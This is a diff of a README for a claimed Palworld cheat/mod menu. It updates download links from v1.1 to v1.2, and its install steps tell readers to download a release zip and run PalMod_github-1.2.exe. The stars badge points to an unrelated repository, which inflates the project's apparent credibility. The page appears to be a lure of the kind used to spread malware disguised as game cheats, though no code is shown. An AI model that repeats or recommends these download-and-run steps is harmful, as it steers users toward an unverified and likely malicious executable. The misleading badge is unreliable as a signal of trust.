@@ -1,7 +1,7 @@
-# Palworld Cheat / Mod Menu (Upd: 15-08-26)
+# Palworld Cheat / Mod Menu (Upd: 16-08-26)
 
-[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/yarnspearcrush/palworld-modmenu/releases/download/v1.1/Palworld-1.1.0.zip)
-[![GitHub release](https://img.shields.io/badge/Release-v1.1-blue?style=for-the-badge)](https://github.com/yarnspearcrush/palworld-modmenu/releases/download/v1.1/Palworld-1.1.0.zip)
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/yarnspearcrush/palworld-modmenu/releases/download/v1.2/Palworld-1.2.0.zip)
+[![GitHub release](https://img.shields.io/badge/Release-v1.2-blue?style=for-the-badge)](https://github.com/yarnspearcrush/palworld-modmenu/releases/download/v1.2/Palworld-1.2.0.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
 [![Stars](https://img.shields.io/github/stars/marwan-at-work/mod?style=for-the-badge&logo=github)](https://github.com/marwan-at-work/mod/stargazers)
 
@@ -48,10 +48,10 @@ A powerful hack tool for Palworld with clean in-game overlay
 ---
 
 ## How to Install
-1. Download the [latest release build](https://github.com/yarnspearcrush/palworld-modmenu/releases/download/v1.1/Palworld-1.1.0.zip) from repo's Releases page.
+1. Download the [latest release build](https://github.com/yarnspearcrush/palworld-modmenu/releases/download/v1.2/Palworld-1.2.0.zip) from repo's Releases page.
 2. Extract the contents to any folder (e.g., `C:\Palworldhakken` or Desktop).
 3. Launch game.
-4. Run `PalMod_github-1.1.exe`.
+4. Run `PalMod_github-1.2.exe`.
 5. Enjoy. Press the toggle hotkey (default: `[Insert]`) to open the menu.
 
 ---
@@ -75,6 +75,6 @@ Simply delete the extracted folder. There are no registry changes or leftover fi
 
 ---
 
-[Download Latest Version](https://github.com/yarnspearcrush/palworld-modmenu/releases/download/v1.1/Palworld-1.1.0.zip)
+[Download Latest Version](https://github.com/yarnspearcrush/palworld-modmenu/releases/download/v1.2/Palworld-1.2.0.zip)
 
 [![Made with C++](https://img.shields.io/badge/Made%20with-C++-f34b7d?style=for-the-badge&logo=c%2B%2B)](https://github.com/yarnspearcrush/palworld-modmenu)
